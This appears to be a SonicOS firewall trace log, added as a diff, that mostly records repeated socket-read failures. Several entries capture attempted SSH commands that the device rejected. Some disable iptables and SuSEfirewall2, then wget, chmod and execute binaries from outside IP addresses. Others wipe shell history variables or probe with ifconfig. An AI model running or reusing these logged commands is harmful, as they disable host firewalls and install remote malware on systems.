+01/15 23:06:47.944: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/15 23:53:41.800: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 00:40:37.032: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 01:14:44.144: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/16 01:27:27.576: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 02:14:20.272: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 03:01:18.496: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 03:48:14.016: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 04:35:08.240: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 05:22:05.592: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 06:08:58.464: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 06:55:48.160: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 07:34:24.208: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/16 07:42:36.832: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 08:29:27.880: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 09:16:21.464: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 10:03:14.688: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 10:50:10.800: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 11:37:11.032: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 12:04:09.832: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/16 12:24:07.096: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 13:11:10.464: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 13:58:09.304: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 14:45:07.352: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 15:32:09.112: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/16 16:19:07.768: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 17:06:10.800: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 17:53:12.672: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 18:40:12.736: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 19:27:09.112: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 20:01:02.432: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/16 20:14:01.288: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/16 21:00:55.608: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 21:47:45.656: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 22:34:39.528: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/16 23:05:04.128: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/16 23:21:32.896: fatal - Read from socket failed: errno = 0x3a, connection_in 78
+01/17 00:08:31.800: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 00:55:32.800: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 01:20:12.928: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/17 01:42:32.032: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 02:29:32.880: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 03:16:32.304: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 04:03:31.128: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 04:50:22.672: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 05:37:18.368: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 06:24:17.736: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 07:01:27.080: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/17 07:11:09.944: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 07:58:05.176: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 08:12:06.800: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/17 08:25:43.000: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/17 08:45:01.352: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/17 09:31:56.720: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/17 09:43:10.528: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/17 10:18:48.480: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/17 11:05:43.624: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 11:52:39.016: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/17 12:39:36.720: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 13:26:30.432: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/17 14:46:45.224: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/17 15:04:20.432: fatal - no hostkey alg
+01/17 15:04:21.384: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/17 18:24:23.672: fatal - do_exec_no_pty not supported in SonicOS command 'wget -c http://222.174.5.50:23123/1123;chmod 777 1123;./1123;'
+01/17 20:57:50.848: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/17 22:24:53.416: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/18 03:22:30.704: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/18 04:12:30.192: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/18 09:19:58.432: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/18 10:28:47.000: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/ffhj44;chmod 777 ffhj44;./ffhj44;'
+01/18 10:31:15.416: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/ffhj44;chmod 777 ffhj44;./ffhj44;'
+01/18 10:32:34.704: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/18 12:11:43.944: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/ffhj44;chmod 777 ffhj44;./ffhj44;'
+01/18 18:03:14.112: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/18 19:58:04.784: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/18 20:45:12.288: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/18 21:32:22.400: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/18 21:50:53.544: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/18 21:54:39.032: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/18 22:19:36.160: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/18 23:06:54.352: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/18 23:54:06.592: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 00:41:14.608: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 00:47:36.432: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/19 01:28:16.176: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 02:15:15.192: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 03:02:16.384: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 03:49:14.000: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 04:36:14.656: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 05:23:12.544: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 05:34:54.544: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/19 06:10:15.704: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 06:57:15.752: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 07:44:19.800: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 08:31:26.864: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 09:18:33.096: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 09:38:19.128: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/19 10:05:43.624: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 10:13:18.912: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/19 10:52:58.016: fatal - Read from socket failed: errno = 0x3a, connection_in 78
+01/19 11:40:18.224: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 12:27:37.368: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 12:40:29.896: CRITICAL - Informational: getFileData2:764: 
+01/19 12:40:29.896: CRITICAL - getFileData2(): failed to open file [bismil.png]
+01/19 13:14:59.096: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 14:02:13.192: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 14:49:33.896: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 15:36:53.144: fatal - Read from socket failed: errno = 0x3a, connection_in 53
+01/19 16:08:46.576: fatal - do_exec_no_pty not supported in SonicOS command '/etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://104.223.72.141:280/qedfsafcxx;chmod 777 qedfsafcxx;./qedfsafcxx;'
+01/19 16:24:15.176: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 17:09:00.816: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/19 17:11:33.112: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 17:17:16.720: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/19 17:58:55.672: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/19 18:27:34.304: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 18:44:54.112: fatal - do_exec_no_pty not supported in SonicOS command 'unset HISTFILE ; unset HISTSIZE'
+01/19 18:44:54.256: fatal - do_exec_no_pty not supported in SonicOS command 'unset HISTFILE ; unset HISTSIZE'
+01/19 18:44:54.256: fatal - do_exec_no_pty not supported in SonicOS command 'unset HISTFILE ; unset HISTSIZE'
+01/19 18:46:07.624: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/19 19:17:52.400: CRITICAL - Informational: getFileData2:764: 
+01/19 19:17:52.400: CRITICAL - getFileData2(): failed to open file [bismil.png]
+01/19 19:33:23.272: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 20:19:30.192: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/19 20:20:37.208: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 21:07:51.288: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 21:55:05.704: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/19 22:42:25.752: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/19 22:53:09.400: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/19 23:29:43.496: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 00:17:02.816: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 01:04:15.464: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 01:12:18.640: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/20 01:51:23.320: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 02:38:30.848: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 03:25:35.224: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 04:12:36.336: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 04:59:38.864: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 05:46:39.416: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 06:33:44.336: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 07:20:48.944: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 08:07:55.512: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 08:55:04.880: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 09:42:18.512: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 10:29:38.864: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/20 11:06:04.240: fatal - do_exec_no_pty not supported in SonicOS command 'ifconfig'
+01/20 11:17:02.896: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 12:04:34.224: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 12:52:04.656: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/20 13:39:28.400: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 14:26:52.640: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 17:04:00.544: fatal - Read from socket failed: errno = 0x36, connection_in 53
+01/20 17:14:02.592: fatal - Read from socket failed: errno = 0x36, connection_in 41
+01/20 19:56:18.832: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 20:39:10.304: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 21:22:09.032: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 22:04:59.192: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 22:33:13.752: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/20 22:47:55.256: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 23:30:50.096: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/20 23:32:10.944: fatal - do_exec_no_pty not supported in SonicOS command '/sbin/ifconfig'
+01/20 23:49:53.880: fatal - do_exec_no_pty not supported in SonicOS command '/sbin/ifconfig'
+01/21 00:13:45.768: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 00:56:40.192: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/21 01:39:31.720: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/21 02:22:20.736: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/21 02:22:31.688: fatal - Read from socket failed: errno = 0x36, connection_in 33
+01/21 03:05:08.288: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 03:47:53.672: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/21 04:30:40.336: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 05:13:23.704: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 05:56:09.608: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 06:38:53.480: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/21 07:21:38.320: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 08:04:25.208: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 08:47:15.720: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 09:30:04.400: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/21 10:12:54.656: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/21 10:55:45.672: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 11:38:42.400: fatal - Read from socket failed: errno = 0x3a, connection_in 46
+01/21 12:21:38.240: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 12:36:50.336: fatal - do_exec_no_pty not supported in SonicOS command '/sbin/ifconfig'
+01/21 12:39:22.352: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 12:45:17.784: fatal - do_exec_no_pty not supported in SonicOS command '/sbin/ifconfig'
+01/21 13:04:36.240: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+01/21 13:47:29.464: fatal - Read from socket failed: errno = 0x3a, connection_in 41
+01/21 14:28:05.528: fatal - do_exec_no_pty not supported in SonicOS command '/sbin/ifconfig'
+01/21 14:30:26.640: fatal - Read from socket failed: errno = 0x3a, connection_in 33
+showed 862 log events
+log core 01: num exceptions 0, state events logged 0, missed 0 - critical events logged 0, missed 0
+log core 02: num exceptions 0, state events logged 0, missed 0 - critical events logged 2, missed 0
+-------critial (non-wrapping) log:
+01/19 07:37:42.128: CRITICAL - DP2: Informational: getHTTPCommandFromPkt:9639: 
+01/19 07:37:42.128: CRITICAL - unexpected HTTP command "/ubuntu/dists/saucy-backports/multiverse/i18n/Translation-en_IN.lzma HTTP/1.1
+Host: archive.ubuntu.com
+Connection: keep-alive
+Cache-Control: max-age=0
+User-Agent: Debian APT-HTTP/1.3 (0.9.9.1~ubuntu1)
+
+'"
+showed 2 log events
+log core 03: num exceptions 0, state events logged 0, missed 0 - critical events logged 0, missed 0
+log core 04: num exceptions 0, state events logged 0, missed 0 - critical events logged 0, missed 0
+log core 05: num exceptions 0, state events logged 0, missed 0 - critical events logged 0, missed 0
+<end of trace log>
